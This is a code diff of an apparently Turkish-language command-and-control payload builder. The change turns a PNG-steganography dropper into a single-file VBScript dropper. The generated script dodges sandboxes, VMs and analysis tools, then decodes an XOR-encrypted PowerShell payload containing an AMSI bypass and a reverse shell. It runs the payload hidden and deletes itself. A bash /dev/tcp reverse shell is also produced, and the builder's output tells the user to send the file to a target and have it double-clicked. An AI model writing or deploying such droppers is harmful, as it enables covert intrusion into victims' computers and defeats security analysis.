@@ -140,96 +140,33 @@ def build_amsi_bypass():
     )
     return amsi + etw
 
-def build_vbs_dropper(png_filename, key_b64, anti_sandbox=True):
-    vbs = f'''On Error Resume Next
-'''
+def build_standalone_vbs(key_b64, pay_b64, anti_sandbox=True):
+    """Tek dosya: Key ve payload doğrudan VBS içine gömülü, harici dosya gerekmez."""
+    vbs = "On Error Resume Next\n"
+
     if anti_sandbox:
-        vbs += '''Dim t1, t2
+        vbs += '''
+' ── Zamanlama Kontrolü (hızlandırılmış sandbox tespiti) ──
+Dim t1, t2
 t1 = Timer
 WScript.Sleep 1500
 t2 = Timer
 If (t2 - t1) < 1 Then WScript.Quit
 
+' ── VM / Sanal Makine Kontrolü ──
 Set wmi = GetObject("winmgmts:")
 Set items = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem")
 For Each item In items
-    m = LCase(item.Manufacturer)
-    mo = LCase(item.Model)
-    If InStr(m, "vmware") > 0 Or InStr(m, "virtualbox") > 0 Or InStr(m, "xen") > 0 Or InStr(mo, "virtual") > 0 Then
+    Dim mfr, mdl
+    mfr = LCase(item.Manufacturer)
+    mdl = LCase(item.Model)
+    If InStr(mfr,"vmware")>0 Or InStr(mfr,"virtualbox")>0 Or InStr(mfr,"xen")>0 Or InStr(mdl,"virtual")>0 Then
         WScript.Quit
     End If
 Next
-'''
-    vbs += f'''
-Set sh = CreateObject("WScript.Shell")
-Dim myDir
-myDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))
-sh.Run """" & myDir & "{png_filename}" & """", 1, False
 
-Set fso = CreateObject("Scripting.FileSystemObject")
-Dim stream
-Set stream = CreateObject("ADODB.Stream")
-stream.Type = 1
-stream.Open
-stream.LoadFromFile myDir & "{png_filename}"
-Dim bArr
-bArr = stream.Read()
-stream.Close
-
-Dim txt, bLen
-bLen = LenB(bArr)
-txt = ""
-Dim chunk, ci
-For ci = 1 To bLen Step 4096
-    Dim cEnd
-    cEnd = ci + 4095
-    If cEnd > bLen Then cEnd = bLen
-    chunk = ""
-    Dim bi
-    For bi = ci To cEnd
-        chunk = chunk & Chr(AscB(MidB(bArr, bi, 1)))
-    Next
-    txt = txt & chunk
-Next
-
-Dim keyB64, payB64
-Dim kPos
-kPos = InStr(txt, "CC 2024 ")
-If kPos > 0 Then
-    Dim kStart
-    kStart = kPos + 8
-    Dim kEnd2
-    kEnd2 = kStart
-    Do While kEnd2 <= Len(txt)
-        Dim ch
-        ch = Mid(txt, kEnd2, 1)
-        If ch = Chr(0) Or Asc(ch) < 32 Then Exit Do
-        kEnd2 = kEnd2 + 1
-    Loop
-    keyB64 = Mid(txt, kStart, kEnd2 - kStart)
-End If
-
-Dim pPos
-pPos = InStr(txt, "Comment" & Chr(0))
-If pPos > 0 Then
-    Dim pStart
-    pStart = pPos + 8
-    Dim pEnd2
-    pEnd2 = pStart
-    Do While pEnd2 <= Len(txt)
-        Dim ch2
-        ch2 = Mid(txt, pEnd2, 1)
-        If Asc(ch2) < 32 Or Asc(ch2) > 127 Then Exit Do
-        pEnd2 = pEnd2 + 1
-    Loop
-    payB64 = Mid(txt, pStart, pEnd2 - pStart)
-End If
-'''
-    if anti_sandbox:
-        vbs += '''
-' ── Analiz aracı tespiti (Wireshark, ProcMon, x64dbg vb.) ──
-Set wmi = GetObject("winmgmts:")
-Dim proc, procs
+' ── Analiz Aracı Tespiti ──
+Dim procs, proc
 Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
 Dim blacklist
 blacklist = Array("wireshark","procmon","procexp","x64dbg","x32dbg","ollydbg","ida","fiddler","httpdebuggerpro","dnspy","pestudio","processhacker")
@@ -242,25 +179,34 @@ For Each proc In procs
     Next
 Next
 
-' ── Ekran çözünürlük ve RAM kontrolü (Sandbox genelde küçük kullanır) ──
-Dim scrW, scrH
+' ── Ekran & RAM Kontrolü ──
+Set sh = CreateObject("WScript.Shell")
+Dim scrW
 scrW = sh.RegRead("HKCU\\Control Panel\\Desktop\\ScreenWidth")
 If CInt(scrW) < 1024 Then WScript.Quit
-
 Dim mem
 For Each item In wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
     mem = CLng(item.TotalPhysicalMemory / 1073741824)
 Next
 If mem < 2 Then WScript.Quit
 
-' ── Rastgele gecikme (3-8 saniye) — davranışsal analizi zorlaştırır ──
+' ── Rastgele Gecikme (3-8s) ──
 Randomize
 WScript.Sleep Int((8000 - 3000 + 1) * Rnd + 3000)
 '''
+    else:
+        vbs += '''
+Set sh = CreateObject("WScript.Shell")
+'''
 
-    vbs += '''
-If Len(keyB64) = 0 Or Len(payB64) = 0 Then WScript.Quit
+    # Key ve payload'ı doğrudan VBS'e göm
+    vbs += f'''
+' ── Gömülü Payload (Base64 + XOR Şifreli) ──
+Dim keyB64, payB64
+keyB64 = "{key_b64}"
+payB64 = "{pay_b64}"
 
+' ── Base64 Decode ──
 Dim xml1
 Set xml1 = CreateObject("MSXML2.DOMDocument")
 Dim node1
@@ -275,9 +221,9 @@ node1.Text = payB64
 Dim payBytes
 payBytes = node1.nodeTypedValue
 
-Dim keyLen
+' ── XOR Çözümleme ──
+Dim keyLen, payLen
 keyLen = LenB(keyBytes)
-Dim payLen
 payLen = LenB(payBytes)
 Dim result
 result = ""
@@ -290,27 +236,27 @@ For idx = 1 To payLen
 Next
 
 '''
-    vbs += '''
-' ── PowerShell Başlat ──
-'''
+    # Çalıştırma
     if anti_sandbox:
         vbs += '''
+' ── Gizli PowerShell Çalıştır ──
 Dim wmiProc
 Set wmiProc = GetObject("winmgmts:Win32_Process")
 wmiProc.Create "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """", Null, Null, Null
 
-' ── Kendini sil (ız bırakma) ──
-Dim fso2
-Set fso2 = CreateObject("Scripting.FileSystemObject")
-fso2.DeleteFile WScript.ScriptFullName, True
+' ── Kendini Sil ──
+Dim fso
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.DeleteFile WScript.ScriptFullName, True
 '''
     else:
         vbs += '''
+' ── PowerShell Çalıştır ──
 Dim psCmd
 psCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """"
 sh.Run psCmd, 0, False
 '''
-    
+
     return vbs
 
 # ══════════════════════════════════════════════════════════
@@ -334,60 +280,45 @@ def c2_payload_builder():
 
     print_line()
     print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
-    print(f"  {C.CYAN}1){C.RESET} Windows (Steganografik PNG)")
+    print(f"  {C.CYAN}1){C.RESET} Windows (Tek Dosya VBS Payload)")
     print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell)")
 
     os_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
 
     if os_choice == '1':
         print_line()
-        print(f"\n{C.BLUE}{C.BOLD}  --- Windows Payload Formatı ---{C.RESET}")
-        print(f"  {C.CYAN}1){C.RESET} Steganografik PNG  {C.DIM}— Payload görsel içine gömülür{C.RESET}")
-        print(f"  {C.CYAN}2){C.RESET} Tek PNG           {C.DIM}— VBS oluşturmadan tek görsel dosyası{C.RESET}")
 
-        fmt_choice = input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()
+        anti_sb_input = input(f"\n{C.CYAN}  [?] Anti-VM/Sandbox koruması açılsın mı? {C.DIM}(Kendi PC'nizde test için 'H'){C.RESET} [E/h]: ").strip().lower()
+        anti_sb = False if anti_sb_input == 'h' else True
 
+        # Payload'ı oluştur
         amsi = build_amsi_bypass()
         shell = build_evasive_ps(lhost, lport)
         full_ps = amsi + ";" + shell
 
-        img_path = input(f"{C.CYAN}  [?] Kapak görseli yolu (PNG) [Örn: photo.png]: {C.RESET}").strip().replace('"', '').replace("'", "")
+        # XOR şifrele
+        key = xor_key(32)
+        enc = xor_crypt(full_ps, key)
+        pay_b64 = base64.b64encode(enc).decode()
+        key_b64 = base64.b64encode(key).decode()
 
-        if not os.path.exists(img_path):
-            print(f"{C.RED}  [-] Hata: Dosya bulunamadı: {img_path}{C.RESET}")
-            input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
-            return
-
-        if fmt_choice == '1':
-            output_dir = "stealth_dropper"
-            os.makedirs(output_dir, exist_ok=True)
-            png_name = "photo.png"
-            out_png = os.path.join(output_dir, png_name)
-
-            anti_sb_input = input(f"\n{C.CYAN}  [?] Gelişmiş Gizlilik (Anti-VM/Sandbox) açılsın mı? (Kendi bilgisayarınızda test ediyorsanız 'H' girin) [E/h]: {C.RESET}").strip().lower()
-            anti_sb = False if anti_sb_input == 'h' else True
-
-            key_b64, err = embed_in_png(img_path, full_ps, out_png)
-            if err:
-                print(f"{C.RED}  [-] Hata: {err}{C.RESET}")
-            else:
-                vbs_content = build_vbs_dropper(png_name, key_b64, anti_sandbox=anti_sb)
-                vbs_path = os.path.join(output_dir, "open_photo.vbs")
-                save_text(vbs_path, vbs_content)
-                print(f"\n{C.GREEN}{C.BOLD}  [+] STEALTH DROPPER PAKETİ HAZIR: {output_dir}/{C.RESET}")
-                print(f"{C.WHITE}      1) {png_name} (Zararlı Payload İçeren Görsel){C.RESET}")
-                print(f"{C.WHITE}      2) open_photo.vbs (Tetikleyici VBS Scripti){C.RESET}")
+        # Tek dosya VBS oluştur
+        vbs_content = build_standalone_vbs(key_b64, pay_b64, anti_sandbox=anti_sb)
         
-        elif fmt_choice == '2':
-            png_name = "photo.png"
-            out_png = png_name
+        output_dir = "stealth_dropper"
+        os.makedirs(output_dir, exist_ok=True)
+        vbs_path = os.path.join(output_dir, "payload.vbs")
+        save_text(vbs_path, vbs_content)
 
-            key_b64, err = embed_in_png(img_path, full_ps, out_png)
-            if err:
-                print(f"{C.RED}  [-] Hata: {err}{C.RESET}")
-            else:
-                print(f"\n{C.GREEN}{C.BOLD}  [+] TEK PNG HAZIR: {os.path.abspath(out_png)}{C.RESET}")
-                print(f"{C.WHITE}      1) {png_name} (Pasif PNG - VBS oluşturulmadı){C.RESET}")
+        print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════╗{C.RESET}")
+        print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA PAYLOAD HAZIR!                     ║{C.RESET}")
+        print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════╝{C.RESET}")
+        print(f"\n{C.WHITE}  📁 Dosya  : {os.path.abspath(vbs_path)}{C.RESET}")
+        print(f"{C.WHITE}  🔐 Şifre  : XOR (Base64 gömülü, harici dosya yok){C.RESET}")
+        print(f"{C.WHITE}  🛡️  Anti-SB: {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
+        print(f"{C.WHITE}  🎯 Hedef  : {lhost}:{lport}{C.RESET}")
+        print(f"\n{C.YELLOW}  [!] Bu dosyayı hedef makineye gönderip çift tıklatmanız yeterli.{C.RESET}")
+        print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")
 
     elif os_choice == '2':
         payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
